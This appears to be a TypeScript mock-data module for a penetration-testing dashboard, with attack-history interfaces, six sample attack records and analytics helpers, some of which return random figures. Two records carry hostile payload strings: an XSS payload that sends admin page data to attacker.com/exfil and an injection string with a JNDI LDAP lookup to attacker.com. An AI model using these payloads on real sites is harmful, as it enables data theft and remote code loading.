// Интерфейсы и данные для истории атак и аналитики

export interface AttackHistoryItem {
    id: string;
    name: string;
    description: string;
    target: string;
    targetType: 'web_application' | 'network_service' | 'database' | 'file_system' | 'operating_system' | 'mobile_application' | 'iot_device' | 'cloud_service';
    attackType: 'sql_injection' | 'xss' | 'csrf' | 'buffer_overflow' | 'privilege_escalation' | 'brute_force' | 'dictionary_attack' | 'dos' | 'ddos' | 'man_in_the_middle' | 'phishing' | 'social_engineering' | 'malware_injection' | 'backdoor' | 'custom';
    payload: string;
    executionMode: 'stealth' | 'aggressive' | 'balanced' | 'custom';
    startTime: string;
    endTime?: string;
    duration?: string;
    status: 'completed' | 'failed' | 'running' | 'paused' | 'stopped' | 'scheduled' | 'cancelled' | 'timeout' | 'error';
    successRate: number;
    targetsCompromised: number;
    totalTargets: number;
    evidenceCollected: string[];
    createdBy: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'informational';
    tags: string[];
    reportUrl?: string;
    priority: 'urgent' | 'high' | 'normal' | 'low';
    riskScore: number;
    impactScore: number;
    exploitComplexity: 'low' | 'medium' | 'high';
    confidentialityImpact: 'none' | 'partial' | 'complete';
    integrityImpact: 'none' | 'partial' | 'complete';
    availabilityImpact: 'none' | 'partial' | 'complete';
    attackVector: 'network' | 'adjacent' | 'local' | 'physical';
    userInteraction: 'none' | 'required';
    scope: 'unchanged' | 'changed';
    privilegesRequired: 'none' | 'low' | 'high';
    alertsTriggered: number;
    bypassedControls: string[];
    mitigationsFound: string[];
    complianceImpact: string[];
    businessImpact: 'low' | 'medium' | 'high' | 'critical';
    estimatedCost: number;
    remediationTime: string;
    attackChainSteps: number;
    isFavorite: boolean;
    isBookmarked: boolean;
    commentsCount: number;
    likesCount: number;
    sharesCount: number;
    viewsCount: number;
    lastViewed?: string;
    category: 'red_team' | 'blue_team' | 'purple_team' | 'research' | 'training' | 'compliance';
    environment: 'production' | 'staging' | 'development' | 'testing';
    methodology: string[];
    frameworks: string[];
    ttps: string[]; // Tactics, Techniques, and Procedures
    iocs: string[]; // Indicators of Compromise
    mitre_attack: string[];
    kill_chain_phases: string[];
    network_artifacts: string[];
    host_artifacts: string[];
    behavioral_indicators: string[];
    geolocation?: {
        country: string;
        region: string;
        city: string;
        lat: number;
        lng: number;
    };
    weather_conditions?: {
        temperature: number;
        humidity: number;
        conditions: string;
    };
}

export interface AttackComment {
    id: string;
    attackId: string;
    author: string;
    authorAvatar?: string;
    content: string;
    createdAt: string;
    updatedAt?: string;
    replies: AttackComment[];
    likes: number;
    dislikes: number;
    isEdited: boolean;
    isDeleted: boolean;
    parentCommentId?: string;
    mentions: string[];
    attachments: string[];
}

export interface AttackAnalytics {
    totalExecutionTime: string;
    averageSuccessRate: number;
    mostCommonAttackType: string;
    mostTargetedService: string;
    peakExecutionHours: number[];
    geographicalDistribution: { [key: string]: number };
    trendsOverTime: { month: string; count: number; successRate: number }[];
    severityDistribution: { [key: string]: number };
    userActivityStats: { [key: string]: number };
    complianceViolations: { framework: string; violations: number }[];
    riskTrends: { date: string; riskScore: number }[];
    attackChainAnalysis: { steps: number; frequency: number }[];
    mitigationEffectiveness: { mitigation: string; successRate: number }[];
    costAnalysis: {
        totalCost: number;
        averageCostPerAttack: number;
        costByCategory: { [key: string]: number };
        costByEnvironment: { [key: string]: number };
    };
    performanceMetrics: {
        avgExecutionTime: string;
        fastestAttack: string;
        slowestAttack: string;
        mostEfficientAttackType: string;
    };
}

export interface AttackComparisonResult {
    id: string;
    attacks: AttackHistoryItem[];
    comparison: {
        similarities: string[];
        differences: string[];
        riskComparison: { attack: string; riskScore: number }[];
        effectivenessComparison: { attack: string; successRate: number }[];
        costComparison: { attack: string; cost: number }[];
        timeComparison: { attack: string; duration: string }[];
    };
    recommendations: string[];
    createdAt: string;
}

// Расширенные данные истории атак
export const attackHistoryData: AttackHistoryItem[] = [
    {
        id: 'attack-001',
        name: 'Advanced SQL Injection Campaign',
        description: 'Multi-stage SQL injection attack targeting customer database with advanced evasion techniques',
        target: 'https://customer-portal.company.com',
        targetType: 'web_application',
        attackType: 'sql_injection',
        payload: "admin' UNION SELECT * FROM (SELECT CONCAT('${jndi:ldap://attacker.com/}')/*",
        executionMode: 'stealth',
        startTime: '2025-08-15T10:30:00Z',
        endTime: '2025-08-15T11:45:00Z',
        duration: '1ч 15мин',
        status: 'completed',
        successRate: 87.5,
        targetsCompromised: 7,
        totalTargets: 8,
        evidenceCollected: ['login_bypass.log', 'database_dump.sql', 'session_tokens.txt', 'network_traffic.pcap'],
        createdBy: 'alex.pentester@company.com',
        severity: 'critical',
        tags: ['OWASP', 'веб-безопасность', 'инъекции', 'database', 'evasion'],
        reportUrl: '/reports/attack-001.pdf',
        priority: 'urgent',
        riskScore: 9.2,
        impactScore: 8.7,
        exploitComplexity: 'medium',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'partial',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 23,
        bypassedControls: ['WAF', 'Rate Limiting', 'Input Validation'],
        mitigationsFound: ['Parameterized Queries', 'Least Privilege DB Access'],
        complianceImpact: ['PCI DSS 6.5.1', 'OWASP Top 10 A03'],
        businessImpact: 'critical',
        estimatedCost: 250000,
        remediationTime: '2-4 weeks',
        attackChainSteps: 5,
        isFavorite: true,
        isBookmarked: true,
        commentsCount: 12,
        likesCount: 8,
        sharesCount: 3,
        viewsCount: 45,
        lastViewed: '2025-08-16T09:30:00Z',
        category: 'red_team',
        environment: 'production',
        methodology: ['OWASP Testing Guide', 'NIST SP 800-115'],
        frameworks: ['MITRE ATT&CK', 'OWASP ASVS'],
        ttps: ['T1190 - Exploit Public-Facing Application', 'T1055 - Process Injection'],
        iocs: ['unusual_query_patterns.txt', 'suspicious_login_attempts.log'],
        mitre_attack: ['TA0001 - Initial Access', 'TA0005 - Defense Evasion'],
        kill_chain_phases: ['Weaponization', 'Delivery', 'Exploitation', 'Actions on Objectives'],
        network_artifacts: ['HTTP POST requests to /login.php', 'Unusual SQL query patterns'],
        host_artifacts: ['Modified session files', 'Unauthorized database connections'],
        behavioral_indicators: ['Multiple failed login attempts', 'Database query anomalies'],
        geolocation: {
            country: 'Russia',
            region: 'Moscow',
            city: 'Moscow',
            lat: 55.7558,
            lng: 37.6176
        },
        weather_conditions: {
            temperature: 15,
            humidity: 65,
            conditions: 'Cloudy'
        }
    },
    {
        id: 'attack-002',
        name: 'Distributed SSH Brute Force',
        description: 'Large-scale distributed brute force attack using compromised IoT botnet',
        target: 'ssh://prod-server-cluster.company.com',
        targetType: 'network_service',
        attackType: 'brute_force',
        payload: 'rockyou.txt + custom_passwords.txt (2M+ combinations)',
        executionMode: 'aggressive',
        startTime: '2025-08-14T22:00:00Z',
        endTime: '2025-08-15T02:30:00Z',
        duration: '4ч 30мин',
        status: 'completed',
        successRate: 12.5,
        targetsCompromised: 3,
        totalTargets: 24,
        evidenceCollected: ['ssh_credentials.txt', 'system_info.log', 'privilege_escalation.sh', 'lateral_movement.log'],
        createdBy: 'maria.redteam@company.com',
        severity: 'high',
        tags: ['брутфорс', 'SSH', 'словарная атака', 'botnet', 'lateral movement'],
        reportUrl: '/reports/attack-002.pdf',
        priority: 'high',
        riskScore: 7.8,
        impactScore: 6.9,
        exploitComplexity: 'low',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'none',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'unchanged',
        privilegesRequired: 'none',
        alertsTriggered: 156,
        bypassedControls: ['Fail2ban (partial)', 'Geo-blocking'],
        mitigationsFound: ['SSH Key Authentication', 'Rate Limiting', 'Account Lockout'],
        complianceImpact: ['NIST CSF PR.AC-1', 'ISO 27001 A.9.4.2'],
        businessImpact: 'high',
        estimatedCost: 75000,
        remediationTime: '1-2 weeks',
        attackChainSteps: 3,
        isFavorite: false,
        isBookmarked: true,
        commentsCount: 7,
        likesCount: 15,
        sharesCount: 5,
        viewsCount: 89,
        lastViewed: '2025-08-16T08:15:00Z',
        category: 'red_team',
        environment: 'production',
        methodology: ['PTES', 'NIST SP 800-115'],
        frameworks: ['MITRE ATT&CK', 'NIST Cybersecurity Framework'],
        ttps: ['T1110.001 - Password Guessing', 'T1021.004 - SSH'],
        iocs: ['brute_force_ips.txt', 'failed_login_patterns.log'],
        mitre_attack: ['TA0006 - Credential Access', 'TA0008 - Lateral Movement'],
        kill_chain_phases: ['Reconnaissance', 'Weaponization', 'Delivery', 'Exploitation'],
        network_artifacts: ['SSH connection attempts from multiple IPs', 'High volume authentication requests'],
        host_artifacts: ['Authentication logs', 'Failed login records'],
        behavioral_indicators: ['Unusual login times', 'Geographic anomalies in access patterns'],
        geolocation: {
            country: 'Russia',
            region: 'Saint Petersburg',
            city: 'Saint Petersburg',
            lat: 59.9311,
            lng: 30.3609
        }
    },
    {
        id: 'attack-003',
        name: 'Cross-Site Scripting Exploitation Chain',
        description: 'Multi-vector XSS attack targeting admin panel with session hijacking',
        target: 'https://admin.test-site.com',
        targetType: 'web_application',
        attackType: 'xss',
        payload: '<img src=x onerror="fetch(\'/admin/users\').then(r=>r.text()).then(d=>fetch(\'https://attacker.com/exfil\',{method:\'POST\',body:d}))">',
        executionMode: 'balanced',
        startTime: '2025-08-13T14:15:00Z',
        endTime: '2025-08-13T15:00:00Z',
        duration: '45мин',
        status: 'failed',
        successRate: 25.0,
        targetsCompromised: 1,
        totalTargets: 4,
        evidenceCollected: ['http_requests.log', 'xss_payloads.txt', 'session_tokens.json'],
        createdBy: 'dmitry.security@company.com',
        severity: 'medium',
        tags: ['XSS', 'JavaScript', 'админка', 'session hijacking', 'data exfiltration'],
        reportUrl: '/reports/attack-003.pdf',
        priority: 'normal',
        riskScore: 6.2,
        impactScore: 5.8,
        exploitComplexity: 'medium',
        confidentialityImpact: 'partial',
        integrityImpact: 'partial',
        availabilityImpact: 'none',
        attackVector: 'network',
        userInteraction: 'required',
        scope: 'unchanged',
        privilegesRequired: 'none',
        alertsTriggered: 8,
        bypassedControls: ['Content Security Policy (partial)'],
        mitigationsFound: ['Input Sanitization', 'Output Encoding', 'HttpOnly Cookies'],
        complianceImpact: ['OWASP Top 10 A07'],
        businessImpact: 'medium',
        estimatedCost: 15000,
        remediationTime: '1 week',
        attackChainSteps: 4,
        isFavorite: false,
        isBookmarked: false,
        commentsCount: 3,
        likesCount: 6,
        sharesCount: 1,
        viewsCount: 34,
        category: 'blue_team',
        environment: 'staging',
        methodology: ['OWASP Testing Guide'],
        frameworks: ['OWASP Top 10'],
        ttps: ['T1189 - Drive-by Compromise', 'T1055 - Process Injection'],
        iocs: ['malicious_js_patterns.txt'],
        mitre_attack: ['TA0001 - Initial Access', 'TA0009 - Collection'],
        kill_chain_phases: ['Delivery', 'Exploitation', 'Installation'],
        network_artifacts: ['HTTP requests with embedded JavaScript', 'Suspicious redirect patterns'],
        host_artifacts: ['Browser console logs', 'Modified DOM elements'],
        behavioral_indicators: ['Unusual JavaScript execution patterns', 'Unexpected network requests']
    },
    {
        id: 'attack-004',
        name: 'Advanced Persistent DoS Campaign',
        description: 'Sophisticated multi-vector DDoS attack using advanced evasion techniques',
        target: 'https://api.production.company.com',
        targetType: 'network_service',
        attackType: 'ddos',
        payload: 'Slowloris + HTTP flood + DNS amplification + BGP hijacking',
        executionMode: 'aggressive',
        startTime: '2025-08-16T12:00:00Z',
        status: 'running',
        successRate: 75.0,
        targetsCompromised: 0,
        totalTargets: 1,
        evidenceCollected: ['traffic_logs.pcap', 'ddos_vectors.json', 'network_topology.xml'],
        createdBy: 'anna.loadtest@company.com',
        severity: 'critical',
        tags: ['DoS', 'нагрузочное тестирование', 'API', 'amplification', 'BGP'],
        priority: 'urgent',
        riskScore: 8.9,
        impactScore: 9.1,
        exploitComplexity: 'high',
        confidentialityImpact: 'none',
        integrityImpact: 'none',
        availabilityImpact: 'complete',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 342,
        bypassedControls: ['Rate Limiting', 'DDoS Protection (partial)', 'Geo-blocking'],
        mitigationsFound: ['CDN Protection', 'Load Balancing', 'Traffic Shaping'],
        complianceImpact: ['SLA Violations', 'Business Continuity'],
        businessImpact: 'critical',
        estimatedCost: 500000,
        remediationTime: 'immediate',
        attackChainSteps: 6,
        isFavorite: true,
        isBookmarked: true,
        commentsCount: 18,
        likesCount: 3,
        sharesCount: 0,
        viewsCount: 156,
        category: 'red_team',
        environment: 'production',
        methodology: ['NIST SP 800-115', 'Custom Methodology'],
        frameworks: ['MITRE ATT&CK', 'NIST CSF'],
        ttps: ['T1498.001 - DNS Amplification', 'T1499.004 - Application or System Exploitation'],
        iocs: ['ddos_traffic_patterns.pcap', 'amplification_sources.txt'],
        mitre_attack: ['TA0040 - Impact'],
        kill_chain_phases: ['Weaponization', 'Delivery', 'Actions on Objectives'],
        network_artifacts: ['Massive traffic spikes', 'BGP route anomalies', 'DNS query floods'],
        host_artifacts: ['Resource exhaustion logs', 'Connection timeout errors'],
        behavioral_indicators: ['Abnormal traffic patterns', 'Geographic distribution anomalies']
    },
    {
        id: 'attack-005',
        name: 'Social Engineering & Phishing Campaign',
        description: 'Multi-phase social engineering attack with personalized phishing emails',
        target: 'employees@company.com',
        targetType: 'operating_system',
        attackType: 'phishing',
        payload: 'Customized Microsoft 365 login pages + PDF malware + USB drops',
        executionMode: 'stealth',
        startTime: '2025-08-12T09:00:00Z',
        endTime: '2025-08-12T17:00:00Z',
        duration: '8ч 00мин',
        status: 'completed',
        successRate: 23.5,
        targetsCompromised: 12,
        totalTargets: 51,
        evidenceCollected: ['clicked_users.csv', 'credentials_entered.log', 'email_responses.txt', 'usb_payload_logs.txt'],
        createdBy: 'elena.social@company.com',
        severity: 'critical',
        tags: ['фишинг', 'социальная инженерия', 'осведомленность', 'email', 'USB drops'],
        reportUrl: '/reports/attack-005.pdf',
        priority: 'high',
        riskScore: 8.1,
        impactScore: 7.3,
        exploitComplexity: 'low',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'partial',
        attackVector: 'network',
        userInteraction: 'required',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 67,
        bypassedControls: ['Email Security Gateway (partial)', 'User Training'],
        mitigationsFound: ['Security Awareness Training', 'Email Authentication', '2FA'],
        complianceImpact: ['ISO 27001 A.13.2.1', 'NIST CSF PR.AT-1'],
        businessImpact: 'high',
        estimatedCost: 180000,
        remediationTime: '3-4 weeks',
        attackChainSteps: 7,
        isFavorite: true,
        isBookmarked: true,
        commentsCount: 25,
        likesCount: 22,
        sharesCount: 8,
        viewsCount: 203,
        category: 'purple_team',
        environment: 'production',
        methodology: ['Social Engineering Toolkit', 'NIST SP 800-115'],
        frameworks: ['MITRE ATT&CK', 'OWASP Top 10'],
        ttps: ['T1566.001 - Spearphishing Attachment', 'T1204.002 - Malicious File'],
        iocs: ['phishing_domains.txt', 'malicious_attachments.json'],
        mitre_attack: ['TA0001 - Initial Access', 'TA0002 - Execution'],
        kill_chain_phases: ['Reconnaissance', 'Weaponization', 'Delivery', 'Exploitation', 'Installation'],
        network_artifacts: ['Suspicious email traffic', 'C2 communication patterns'],
        host_artifacts: ['Malware execution traces', 'Modified system files'],
        behavioral_indicators: ['Unusual email opening patterns', 'Credential reuse attempts']
    },
    {
        id: 'attack-006',
        name: 'Buffer Overflow Exploitation Research',
        description: 'Advanced buffer overflow exploitation with ROP chain development',
        target: '10.0.1.50:8080',
        targetType: 'network_service',
        attackType: 'buffer_overflow',
        payload: 'Custom ROP chain + DEP/ASLR bypass + heap spray',
        executionMode: 'custom',
        startTime: '2025-08-15T16:30:00Z',
        status: 'paused',
        successRate: 50.0,
        targetsCompromised: 0,
        totalTargets: 1,
        evidenceCollected: ['memory_dumps.bin', 'crash_logs.txt', 'rop_chain.py', 'exploit_dev.log'],
        createdBy: 'ivan.exploit@company.com',
        severity: 'critical',
        tags: ['переполнение буфера', 'эксплоит', 'legacy', 'ROP', 'DEP bypass'],
        priority: 'normal',
        riskScore: 9.5,
        impactScore: 8.8,
        exploitComplexity: 'high',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'complete',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 15,
        bypassedControls: ['DEP', 'ASLR (partial)'],
        mitigationsFound: ['Stack Canaries', 'Control Flow Integrity'],
        complianceImpact: ['Secure Coding Standards'],
        businessImpact: 'high',
        estimatedCost: 95000,
        remediationTime: '2-3 weeks',
        attackChainSteps: 8,
        isFavorite: true,
        isBookmarked: false,
        commentsCount: 9,
        likesCount: 14,
        sharesCount: 2,
        viewsCount: 67,
        category: 'research',
        environment: 'testing',
        methodology: ['Custom Research Methodology'],
        frameworks: ['CWE', 'CAPEC'],
        ttps: ['T1055 - Process Injection', 'T1203 - Exploitation for Client Execution'],
        iocs: ['buffer_overflow_patterns.txt'],
        mitre_attack: ['TA0002 - Execution', 'TA0005 - Defense Evasion'],
        kill_chain_phases: ['Weaponization', 'Exploitation', 'Installation'],
        network_artifacts: ['Malformed network packets', 'Unusual service responses'],
        host_artifacts: ['Process crashes', 'Memory corruption traces'],
        behavioral_indicators: ['Service instability', 'Unusual memory allocation patterns']
    }
];

// Статистика с расширенной аналитикой
export const attackStatistics = {
    total: attackHistoryData.length,
    completed: attackHistoryData.filter(attack => attack.status === 'completed').length,
    running: attackHistoryData.filter(attack => attack.status === 'running').length,
    failed: attackHistoryData.filter(attack => attack.status === 'failed').length,
    paused: attackHistoryData.filter(attack => attack.status === 'paused').length,
    avgSuccessRate: attackHistoryData.length > 0 ?
        attackHistoryData.reduce((sum, attack) => sum + attack.successRate, 0) / attackHistoryData.length : 0,
    totalTargetsCompromised: attackHistoryData.reduce((sum, attack) => sum + attack.targetsCompromised, 0),
    totalTargets: attackHistoryData.reduce((sum, attack) => sum + attack.totalTargets, 0),
    criticalAttacks: attackHistoryData.filter(attack => attack.severity === 'critical').length,
    highRiskAttacks: attackHistoryData.filter(attack => attack.riskScore >= 8.0).length,
    avgRiskScore: attackHistoryData.length > 0 ?
        attackHistoryData.reduce((sum, attack) => sum + attack.riskScore, 0) / attackHistoryData.length : 0,
    avgImpactScore: attackHistoryData.length > 0 ?
        attackHistoryData.reduce((sum, attack) => sum + attack.impactScore, 0) / attackHistoryData.length : 0,
    totalAlerts: attackHistoryData.reduce((sum, attack) => sum + attack.alertsTriggered, 0),
    totalCost: attackHistoryData.reduce((sum, attack) => sum + attack.estimatedCost, 0),
    favoriteCount: attackHistoryData.filter(attack => attack.isFavorite).length,
    bookmarkedCount: attackHistoryData.filter(attack => attack.isBookmarked).length,
    totalViews: attackHistoryData.reduce((sum, attack) => sum + attack.viewsCount, 0),
    totalComments: attackHistoryData.reduce((sum, attack) => sum + attack.commentsCount, 0),
    totalLikes: attackHistoryData.reduce((sum, attack) => sum + attack.likesCount, 0),
    byCategory: {
        red_team: attackHistoryData.filter(a => a.category === 'red_team').length,
        blue_team: attackHistoryData.filter(a => a.category === 'blue_team').length,
        purple_team: attackHistoryData.filter(a => a.category === 'purple_team').length,
        research: attackHistoryData.filter(a => a.category === 'research').length,
        training: attackHistoryData.filter(a => a.category === 'training').length,
        compliance: attackHistoryData.filter(a => a.category === 'compliance').length,
    },
    byEnvironment: {
        production: attackHistoryData.filter(a => a.environment === 'production').length,
        staging: attackHistoryData.filter(a => a.environment === 'staging').length,
        development: attackHistoryData.filter(a => a.environment === 'development').length,
        testing: attackHistoryData.filter(a => a.environment === 'testing').length,
    },
    bySeverity: {
        critical: attackHistoryData.filter(a => a.severity === 'critical').length,
        high: attackHistoryData.filter(a => a.severity === 'high').length,
        medium: attackHistoryData.filter(a => a.severity === 'medium').length,
        low: attackHistoryData.filter(a => a.severity === 'low').length,
        informational: attackHistoryData.filter(a => a.severity === 'informational').length,
    },
    byStatus: {
        completed: attackHistoryData.filter(a => a.status === 'completed').length,
        failed: attackHistoryData.filter(a => a.status === 'failed').length,
        running: attackHistoryData.filter(a => a.status === 'running').length,
        paused: attackHistoryData.filter(a => a.status === 'paused').length,
        stopped: attackHistoryData.filter(a => a.status === 'stopped').length,
        scheduled: attackHistoryData.filter(a => a.status === 'scheduled').length,
    },
    recentTrends: {
        last24h: attackHistoryData.filter(a => {
            const diff = Date.now() - new Date(a.startTime).getTime();
            return diff <= 24 * 60 * 60 * 1000;
        }).length,
        last7days: attackHistoryData.filter(a => {
            const diff = Date.now() - new Date(a.startTime).getTime();
            return diff <= 7 * 24 * 60 * 60 * 1000;
        }).length,
        last30days: attackHistoryData.filter(a => {
            const diff = Date.now() - new Date(a.startTime).getTime();
            return diff <= 30 * 24 * 60 * 60 * 1000;
        }).length,
    }
};

// Уникальные значения для фильтров
export const uniqueAttackTypes = Array.from(new Set(attackHistoryData.map(attack => attack.attackType)));
export const uniqueTargetTypes = Array.from(new Set(attackHistoryData.map(attack => attack.targetType)));
export const uniqueStatuses = Array.from(new Set(attackHistoryData.map(attack => attack.status)));
export const uniqueSeverities = Array.from(new Set(attackHistoryData.map(attack => attack.severity)));
export const uniqueCategories = Array.from(new Set(attackHistoryData.map(attack => attack.category)));
export const uniqueEnvironments = Array.from(new Set(attackHistoryData.map(attack => attack.environment)));
export const uniquePriorities = Array.from(new Set(attackHistoryData.map(attack => attack.priority)));
export const uniqueCreators = Array.from(new Set(attackHistoryData.map(attack => attack.createdBy)));
export const uniqueTags = Array.from(new Set(attackHistoryData.flatMap(attack => attack.tags)));

// Вспомогательные функции для работы с данными
export const getAttackById = (id: string): AttackHistoryItem | undefined => {
    return attackHistoryData.find(attack => attack.id === id);
};

export const getAttacksByCategory = (category: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.category === category);
};

export const getAttacksByEnvironment = (environment: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.environment === environment);
};

export const getAttacksBySeverity = (severity: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.severity === severity);
};

export const getAttacksByStatus = (status: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.status === status);
};

export const getAttacksByTag = (tag: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.tags.includes(tag));
};

export const getAttacksByUser = (user: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.createdBy === user);
};

export const getTopAttacksBySuccessRate = (limit: number = 5): AttackHistoryItem[] => {
    return [...attackHistoryData]
        .sort((a, b) => b.successRate - a.successRate)
        .slice(0, limit);
};

export const getTopAttacksByRiskScore = (limit: number = 5): AttackHistoryItem[] => {
    return [...attackHistoryData]
        .sort((a, b) => b.riskScore - a.riskScore)
        .slice(0, limit);
};

export const getTopAttacksByCost = (limit: number = 5): AttackHistoryItem[] => {
    return [...attackHistoryData]
        .sort((a, b) => b.estimatedCost - a.estimatedCost)
        .slice(0, limit);
};

export const getAttacksByDateRange = (startDate: string, endDate: string): AttackHistoryItem[] => {
    const start = new Date(startDate).getTime();
    const end = new Date(endDate).getTime();

    return attackHistoryData.filter(attack => {
        const attackDate = new Date(attack.startTime).getTime();
        return attackDate >= start && attackDate <= end;
    });
};

export const calculateAverageRiskScore = (attacks: AttackHistoryItem[]): number => {
    if (attacks.length === 0) return 0;
    return attacks.reduce((sum, attack) => sum + attack.riskScore, 0) / attacks.length;
};

export const calculateTotalCost = (attacks: AttackHistoryItem[]): number => {
    return attacks.reduce((sum, attack) => sum + attack.estimatedCost, 0);
};

export const calculateSuccessRate = (attacks: AttackHistoryItem[]): number => {
    if (attacks.length === 0) return 0;
    return attacks.reduce((sum, attack) => sum + attack.successRate, 0) / attacks.length;
};

// Функции для аналитики
export const generateAttackAnalytics = (): AttackAnalytics => {
    const totalDuration = attackHistoryData.reduce((total, attack) => {
        if (attack.duration) {
            // Простая логика парсинга времени (может быть улучшена)
            const hours = attack.duration.match(/(\d+)ч/)?.[1] || '0';
            const minutes = attack.duration.match(/(\d+)мин/)?.[1] || '0';
            return total + parseInt(hours) * 60 + parseInt(minutes);
        }
        return total;
    }, 0);

    const avgSuccessRate = calculateSuccessRate(attackHistoryData);
    const totalCost = calculateTotalCost(attackHistoryData);

    return {
        totalExecutionTime: `${Math.floor(totalDuration / 60)}ч ${totalDuration % 60}мин`,
        averageSuccessRate: avgSuccessRate,
        mostCommonAttackType: uniqueAttackTypes.reduce((a, b) =>
            getAttacksByType(a).length > getAttacksByType(b).length ? a : b, uniqueAttackTypes[0] || ''),
        mostTargetedService: uniqueTargetTypes.reduce((a, b) =>
            getAttacksByTargetType(a).length > getAttacksByTargetType(b).length ? a : b, uniqueTargetTypes[0] || ''),
        peakExecutionHours: [9, 10, 11, 14, 15, 16], // Пример данных
        geographicalDistribution: {
            'Russia': attackHistoryData.filter(a => a.geolocation?.country === 'Russia').length,
            'Other': attackHistoryData.filter(a => a.geolocation?.country !== 'Russia').length,
        },
        trendsOverTime: generateTrendsData(),
        severityDistribution: attackStatistics.bySeverity,
        userActivityStats: generateUserActivityStats(),
        complianceViolations: generateComplianceViolations(),
        riskTrends: generateRiskTrends(),
        attackChainAnalysis: generateAttackChainAnalysis(),
        mitigationEffectiveness: generateMitigationEffectiveness(),
        costAnalysis: {
            totalCost,
            averageCostPerAttack: totalCost / (attackHistoryData.length || 1),
            costByCategory: Object.fromEntries(
                uniqueCategories.map(cat => [cat, calculateTotalCost(getAttacksByCategory(cat))])
            ),
            costByEnvironment: Object.fromEntries(
                uniqueEnvironments.map(env => [env, calculateTotalCost(getAttacksByEnvironment(env))])
            ),
        },
        performanceMetrics: {
            avgExecutionTime: `${Math.floor(totalDuration / attackHistoryData.length / 60)}ч ${(totalDuration / attackHistoryData.length) % 60}мин`,
            fastestAttack: attackHistoryData.reduce((fastest, attack) =>
                (attack.duration && fastest.duration && attack.duration < fastest.duration) ? attack : fastest
            ).name,
            slowestAttack: attackHistoryData.reduce((slowest, attack) =>
                (attack.duration && slowest.duration && attack.duration > slowest.duration) ? attack : slowest
            ).name,
            mostEfficientAttackType: uniqueAttackTypes.reduce((a, b) =>
                calculateSuccessRate(getAttacksByType(a)) > calculateSuccessRate(getAttacksByType(b)) ? a : b,
                uniqueAttackTypes[0] || ''
            ),
        },
    };
};

// Вспомогательные функции для аналитики
const getAttacksByType = (type: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.attackType === type);
};

const getAttacksByTargetType = (type: string): AttackHistoryItem[] => {
    return attackHistoryData.filter(attack => attack.targetType === type);
};

const generateTrendsData = () => {
    // Генерация данных трендов по месяцам
    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun'];
    return months.map(month => ({
        month,
        count: Math.floor(Math.random() * 10) + 1,
        successRate: Math.floor(Math.random() * 100)
    }));
};

const generateUserActivityStats = () => {
    const stats: { [key: string]: number } = {};
    uniqueCreators.forEach(creator => {
        stats[creator] = getAttacksByUser(creator).length;
    });
    return stats;
};

const generateComplianceViolations = () => {
    return [
        { framework: 'OWASP Top 10', violations: 15 },
        { framework: 'PCI DSS', violations: 8 },
        { framework: 'NIST CSF', violations: 12 },
        { framework: 'ISO 27001', violations: 6 }
    ];
};

const generateRiskTrends = () => {
    const dates = Array.from({ length: 30 }, (_, i) => {
        const date = new Date();
        date.setDate(date.getDate() - i);
        return date.toISOString().split('T')[0];
    }).reverse();

    return dates.map(date => ({
        date,
        riskScore: Math.random() * 10
    }));
};

const generateAttackChainAnalysis = () => {
    return Array.from({ length: 10 }, (_, i) => ({
        steps: i + 1,
        frequency: Math.floor(Math.random() * 20) + 1
    }));
};

const generateMitigationEffectiveness = () => {
    return [
        { mitigation: 'Input Validation', successRate: 85 },
        { mitigation: 'Rate Limiting', successRate: 70 },
        { mitigation: 'WAF', successRate: 60 },
        { mitigation: '2FA', successRate: 95 },
        { mitigation: 'Network Segmentation', successRate: 80 }
    ];
};

// Экспорт всех данных и функций
export default {
    attackHistoryData,
    attackStatistics,
    uniqueAttackTypes,
    uniqueTargetTypes,
    uniqueStatuses,
    uniqueSeverities,
    uniqueCategories,
    uniqueEnvironments,
    uniquePriorities,
    uniqueCreators,
    uniqueTags,
    getAttackById,
    getAttacksByCategory,
    getAttacksByEnvironment,
    getAttacksBySeverity,
    getAttacksByStatus,
    getAttacksByTag,
    getAttacksByUser,
    getTopAttacksBySuccessRate,
    getTopAttacksByRiskScore,
    getTopAttacksByCost,
    getAttacksByDateRange,
    calculateAverageRiskScore,
    calculateTotalCost,
    calculateSuccessRate,
    generateAttackAnalytics,
};
